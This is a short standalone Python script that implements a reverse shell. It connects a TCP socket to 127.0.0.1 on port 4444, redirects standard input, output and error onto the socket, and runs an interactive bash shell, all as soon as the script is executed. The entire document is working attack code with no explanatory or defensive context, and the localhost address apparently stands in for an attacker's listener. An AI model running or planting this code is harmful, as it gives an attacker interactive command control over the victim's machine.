#!/usr/bin/python3

import socket
from os import dup2
from subprocess import run


def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 4444))

    dup2(s.fileno(), 0)
    dup2(s.fileno(), 1)
    dup2(s.fileno(), 2)

    run(["/bin/bash", "-i"])


reverse_shell()
